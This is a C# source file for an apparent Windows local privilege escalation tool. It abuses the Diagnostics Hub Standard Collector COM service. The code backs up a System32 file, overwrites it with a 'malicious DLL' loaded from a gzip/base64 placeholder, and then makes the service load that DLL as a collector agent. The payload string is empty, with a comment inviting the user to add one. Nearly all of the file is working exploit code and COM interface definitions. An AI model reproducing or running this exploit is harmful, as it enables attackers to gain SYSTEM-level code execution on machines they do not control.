using System;
using System.IO;
using System.Threading;
using System.Diagnostics;
using System.Globalization;
using System.IO.Compression;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace SystemCollector
{
    public class DLL
    {

        private static IStandardCollectorService _service;

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int ManualRegisterInterfacesDelegate();

        public static void Load(string filename)
        {
            // add your shizz here
            var dll = DecompressDLL(Convert.FromBase64String(""));

            var sessionId = Guid.NewGuid();
            var scratch = $@"C:\Users\{Environment.UserName}\AppData\Local\Temp";

            // backup
            Console.WriteLine($@" [>] Backing up {filename} to {scratch}");
            File.Copy($@"C:\Windows\System32\{filename}", $@"{scratch}\{filename}");

            // overwrite
            Console.WriteLine($@" [>] Overwriting C:\Windows\System32\{filename} with malicious DLL");
            File.WriteAllBytes($@"C:\Windows\System32\{filename}", dll);

            Thread.Sleep(1000);

            var procId = Process.GetCurrentProcess().Id;
            var sessionConfiguration = new SessionConfiguration
            {
                ClientLocale = (ushort)CultureInfo.InvariantCulture.LCID,
                CollectorScratch = scratch,
                Location = CollectionLocation.Local,
                Flags = SessionConfigurationFlags.None,
                LifetimeMonitorProcessId = (uint)procId,
                SessionId = sessionId,
                Type = CollectionType.Etw
            };

            var procIds = new List<uint> { (uint)procId };

            var badAgent = new Dictionary<Guid, string>
            {
                {DefaultAgent.Clsid, DefaultAgent.AssemblyName},
                {sessionId, filename}
            };

            Console.WriteLine(" [>] Getting new collector service");
            _service = GetCollectorService();

            SetProxyBlanketForService(_service);
            Console.WriteLine(" [>] Starting session with DLL payload");
            Start(sessionConfiguration, badAgent, procIds);
            Console.WriteLine($@" [!] All Done. Remember to restore {scratch}\{filename}");

            // give it some time. if you exit too early, it won't run.
            Thread.Sleep(3000);
        }

        public static byte[] DecompressDLL(byte[] gzip)
        {
            using (GZipStream stream = new GZipStream(new MemoryStream(gzip), CompressionMode.Decompress))
            {
                const int size = 4096;
                byte[] buffer = new byte[size];
                using (MemoryStream memory = new MemoryStream())
                {
                    int count = 0;
                    do
                    {
                        count = stream.Read(buffer, 0, size);
                        if (count > 0)
                        {
                            memory.Write(buffer, 0, count);
                        }
                    }
                    while (count > 0);
                    return memory.ToArray();
                }
            }
        }

        public static void Start(SessionConfiguration sessionConfiguration, Dictionary<Guid, string> agents, List<uint> processIds)
        {
            var collectionSession = _service.CreateSession(ref sessionConfiguration);

            foreach (var agent in agents)
            {
                try
                {
                    var name = agent.Value;
                    var clsid = agent.Key;
                    collectionSession.AddAgent(name, ref clsid);
                }
                catch (Exception ex)
                {
                    Console.WriteLine(agent.Key == sessionConfiguration.SessionId
                        ? " [>] DLL should have loaded"
                        : $" [x] Error adding agent {agent.Key}: {ex.Message}");
                }
            }

            collectionSession.Start();
            Console.WriteLine(" [>] Collector session started");

            SetProxyBlanketForSession(collectionSession);
            foreach (var processId in processIds)
                collectionSession.PostStringToListener(DefaultAgent.Clsid, DefaultAgent.AddTargetProcess(processId));
        }

        private static IStandardCollectorService GetCollectorService()
        {
            LoadProxyStubsForCollectorService();
            object obj = null;
            try
            {
                NativeMethods.CoCreateInstance(typeof(StandardCollectorServiceClass).GUID, null, 4u, typeof(IStandardCollectorService).GUID, out obj);
            }
            catch (COMException ex)
            {
                Console.WriteLine($"Error getting collector service: {ex.Message}");
            }
            return obj as IStandardCollectorService;
        }

        private static void LoadProxyStubsForCollectorService()
        {
            var intPtr = NativeMethods.LoadLibraryEx(Environment.Is64BitProcess
                    ? @"C:\Windows\System32\DiagSvcs\DiagnosticsHub.StandardCollector.Proxy.dll"
                    : @"C:\Windows\SysWOW64\DiagSvcs\DiagnosticsHub.StandardCollector.Proxy.dll",
                IntPtr.Zero, 0);

            if (intPtr == IntPtr.Zero)
                throw new Exception("Invalid proxy dll pointer");

            var procAddress = NativeMethods.GetProcAddress(intPtr, "ManualRegisterInterfaces");
            if (procAddress == IntPtr.Zero)
                throw new Exception("Invalid ManualRegisterInterfaces pointer");

            var manualRegisterInterfacesDelegate = (ManualRegisterInterfacesDelegate)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(ManualRegisterInterfacesDelegate));
            Marshal.ThrowExceptionForHR(manualRegisterInterfacesDelegate());
        }

        private static void SetProxyBlanketForService(IStandardCollectorService service)
        {
            var guid = typeof(IStandardCollectorService).GUID;
            var iunknownForObject = Marshal.GetIUnknownForObject(service);
            var errorCode = Marshal.QueryInterface(iunknownForObject, ref guid, out var intPtr);

            Marshal.ThrowExceptionForHR(errorCode);
            try
            {
                errorCode = NativeMethods.CoSetProxyBlanket(intPtr, uint.MaxValue, uint.MaxValue, IntPtr.Zero, 0u, 3u, IntPtr.Zero, 2048u);
                Marshal.ThrowExceptionForHR(errorCode);
            }
            finally
            {
                if (intPtr != IntPtr.Zero)
                    Marshal.Release(intPtr);
            }
        }

        private static void SetProxyBlanketForSession(ICollectionSession session)
        {
            var guid = typeof(ICollectionSession).GUID;
            var iunknownForObject = Marshal.GetIUnknownForObject(session);
            var errorCode = Marshal.QueryInterface(iunknownForObject, ref guid, out var intPtr);
            Marshal.ThrowExceptionForHR(errorCode);

            try
            {
                errorCode = NativeMethods.CoSetProxyBlanket(intPtr, uint.MaxValue, uint.MaxValue, IntPtr.Zero, 0u, 3u, IntPtr.Zero, 2048u);
                Marshal.ThrowExceptionForHR(errorCode);
            }
            finally
            {
                if (intPtr != IntPtr.Zero)
                    Marshal.Release(intPtr);
            }
        }
    }

    public static class NativeMethods
    {
        [DllImport("ole32.dll", ExactSpelling = true, PreserveSig = false)]
        internal static extern int CoSetProxyBlanket(
            IntPtr pProxy,
            uint dwAuthnSvc,
            uint dwAuthzSvc,
            IntPtr pServerPrincName,
            uint dwAuthnLevel,
            uint dwImpLevel,
            IntPtr pAuthInfo,
            uint dwCapabilities
        );

        [DllImport("ole32.dll", ExactSpelling = true, PreserveSig = false)]
        [return: MarshalAs(UnmanagedType.Interface)]
        internal static extern void CoCreateInstance(
            [MarshalAs(UnmanagedType.LPStruct)] [In] Guid rclsid,
            [MarshalAs(UnmanagedType.IUnknown)] object aggregateObject,
            uint classContext,
            [MarshalAs(UnmanagedType.LPStruct)] [In] Guid riid,
            [MarshalAs(UnmanagedType.IUnknown)] out object returnedComObject
        );

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
        internal static extern IntPtr LoadLibraryEx(
            string lpFileName,
            IntPtr hReservedNull,
            int dwFlags
        );

        [DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Ansi, ThrowOnUnmappableChar = true)]
        internal static extern IntPtr GetProcAddress(
            IntPtr hModule,
            [MarshalAs(UnmanagedType.LPStr)] string procname
        );
    }

    public enum CollectionType
    {
        Unknown,
        Etw
    }

    public enum CollectionLocation
    {
        Local,
        Remote,
        Headless
    }

    public enum SessionConfigurationFlags
    {
        None,
        DisposeOfRawData,
        DebuggerCollection,
        NoSessionPackage = 4
    }

    public enum SessionEvent
    {
        BeforeSessionStart = 1,
        AfterSessionStart,
        BeforeProcessLaunch,
        AfterProcessLaunch,
        StartProfilingProcess,
        StopProfilingProcess,
        EnterDebuggerBreakState,
        ExitDebuggerBreakState,
        BeforeSessionStop,
        AfterSessionStop
    }

    public enum SessionState
    {
        Unknown,
        Created,
        Running,
        Paused,
        Stopped,
        Errored
    }

    [ComConversionLoss]
    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    public struct GraphDataUpdates
    {
        public uint Length;

        [ComConversionLoss]
        public IntPtr Updates;
    }

    [ComConversionLoss]
    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    public struct CollectorByteMessage
    {
        public uint Length;

        [ComConversionLoss]
        public IntPtr Message;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    public struct SessionConfiguration
    {
        public CollectionType Type;
        public CollectionLocation Location;
        public SessionConfigurationFlags Flags;
        public uint LifetimeMonitorProcessId;
        public Guid SessionId;

        [MarshalAs(UnmanagedType.BStr)]
        public string CollectorScratch;
        public ushort ClientLocale;
    }

    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("929a9813-d378-4ac5-871c-c280a5b7bf28")]
    [ComImport]
    public interface IStandardCollectorMessagePort
    {
        [MethodImpl(MethodImplOptions.InternalCall)]
        void PostStringToListener(
            [In] Guid listenerId,
            [MarshalAs(UnmanagedType.LPWStr)] [In] string payload
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        void PostBytesToListener(
            [In] Guid listenerId,
            [In] ref CollectorByteMessage payload
        );
    }

    [Guid("60a2c2a0-bb00-48b6-b6ac-7be5f3211af5")]
    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [ComImport]
    public interface ICollectionSession : IStandardCollectorMessagePort
    {
        [MethodImpl(MethodImplOptions.InternalCall)]
        new void PostStringToListener(
            [In] Guid listenerId, 
            [MarshalAs(UnmanagedType.LPWStr)] [In] string payload
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        new void PostBytesToListener(
            [In] Guid listenerId, 
            [In] ref CollectorByteMessage payload
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        void AddAgent(
            [MarshalAs(UnmanagedType.LPWStr)] [In] string agentName, 
            [In] ref Guid clsid
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.Struct)]
        object Start();

        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.Struct)]
        object GetCurrentResult([In] bool pauseCollection);

        [MethodImpl(MethodImplOptions.InternalCall)]
        void Pause();

        [MethodImpl(MethodImplOptions.InternalCall)]
        void Resume();

        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.Struct)]
        object Stop();

        [MethodImpl(MethodImplOptions.InternalCall)]
        void TriggerEvent(
            [In] SessionEvent eventType, 
            [MarshalAs(UnmanagedType.Struct)] [In] ref object eventArg1, 
            [MarshalAs(UnmanagedType.Struct)] [In] ref object eventArg2, 
            [MarshalAs(UnmanagedType.Struct)] out object eventOut
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        GraphDataUpdates GetGraphDataUpdates(
            [In] ref Guid agentId, 
            [MarshalAs(UnmanagedType.SafeArray, SafeArraySubType = VarEnum.VT_BSTR)] [In] string[] counterIdAsBstrs
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        SessionState QueryState();

        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.BStr)]
        string GetStatusChangeEventName();

        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.Error)]
        int GetLastError();

        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.Struct)]
        object SetClientDelegate(
            [MarshalAs(UnmanagedType.Interface)] [In] IStandardCollectorClientDelegate clientDelegate = null
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        void AddAgentWithConfiguration(
            [MarshalAs(UnmanagedType.LPWStr)] [In] string agentName, 
            [In] ref Guid clsid, 
            [MarshalAs(UnmanagedType.LPWStr)] [In] string agentConfiguration
        );
    }

    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("4323664b-b884-4929-8377-d2fd097f7bd3")]
    [ComImport]
    public interface IStandardCollectorClientDelegate
    {
        [MethodImpl(MethodImplOptions.InternalCall)]
        void OnReceiveString(
            [In] ref Guid listenerId,
            [MarshalAs(UnmanagedType.LPWStr)] [In] string payload
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        void OnReceiveBytes(
            [In] ref Guid listenerId,
            [In] ref CollectorByteMessage payload
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        void OnReceiveFile(
            [In] ref Guid listenerId,
            [MarshalAs(UnmanagedType.LPWStr)] [In] string localFilePath,
            [In] bool deleteAfterPost
        );
    }

    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("2d2ac45d-03bb-4b8a-8efe-93ef98217054")]
    [ComImport]
    public interface IStandardCollectorAuthorizationService
    {
        [MethodImpl(MethodImplOptions.InternalCall)]
        void AuthorizeSession([In] ref Guid sessionId);
    }

    [InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
    [Guid("0D8AF6B7-EFD5-4F6D-A834-314740AB8CAA")]
    [ComImport]
    public interface IStandardCollectorService
    {
        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.Interface)]
        ICollectionSession CreateSession(
            [In] ref SessionConfiguration sessionConfig,
            [MarshalAs(UnmanagedType.Interface)] [In] IStandardCollectorClientDelegate clientDelegate = null
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.Interface)]
        ICollectionSession GetSession([In] ref Guid sessionId);

        [MethodImpl(MethodImplOptions.InternalCall)]
        void DestroySession([In] ref Guid sessionId);

        [MethodImpl(MethodImplOptions.InternalCall)]
        void DestroySessionAsync([In] ref Guid sessionId);

        [MethodImpl(MethodImplOptions.InternalCall)]
        void AddLifetimeMonitorProcessIdForSession(
            [In] ref Guid sessionId, [In] uint lifetimeMonitorProcessId
        );
    }

    [CoClass(typeof(StandardCollectorServiceClass))]
    [Guid("0D8AF6B7-EFD5-4F6D-A834-314740AB8CAA")]
    [ComImport]
    public interface StandardCollectorService : IStandardCollectorService
    {
    }

    [TypeLibType(TypeLibTypeFlags.FCanCreate)]
    [ClassInterface(ClassInterfaceType.None)]
    [Guid("42CBFAA7-A4A7-47BB-B422-BD10E9D02700")]
    [ComImport]
    public class StandardCollectorServiceClass : StandardCollectorService, IStandardCollectorAuthorizationService
    {
        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.Interface)]
        public virtual extern ICollectionSession CreateSession(
            [In] ref SessionConfiguration sessionConfig, 
            [MarshalAs(UnmanagedType.Interface)] [In] IStandardCollectorClientDelegate clientDelegate = null
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        [return: MarshalAs(UnmanagedType.Interface)]
        public virtual extern ICollectionSession GetSession([In] ref Guid sessionId);

        [MethodImpl(MethodImplOptions.InternalCall)]
        public virtual extern void DestroySession([In] ref Guid sessionId);

        [MethodImpl(MethodImplOptions.InternalCall)]
        public virtual extern void DestroySessionAsync([In] ref Guid sessionId);

        [MethodImpl(MethodImplOptions.InternalCall)]
        public virtual extern void AddLifetimeMonitorProcessIdForSession(
            [In] ref Guid sessionId, 
            [In] uint lifetimeMonitorProcessId
        );

        [MethodImpl(MethodImplOptions.InternalCall)]
        public virtual extern void AuthorizeSession([In] ref Guid sessionId);
    }
    
    public class DefaultAgent
    {
        public static readonly Guid Clsid = new Guid("E485D7A9-C21B-4903-892E-303C10906F6E");
        public static readonly string AssemblyName = "DiagnosticsHub.StandardCollector.Runtime.dll";

        public static string AddTargetProcess(uint processId) => 
            $"{{ \"command\":\"addTargetProcess\", \"processId\":{processId}, \"startReason\":0, \"requestRundown\":true }}";

        public static string RemoveTargetProcess(uint processId) => 
            $"{{ \"command\":\"removeTargetProcess\", \"processId\":{processId} }}";
    }
}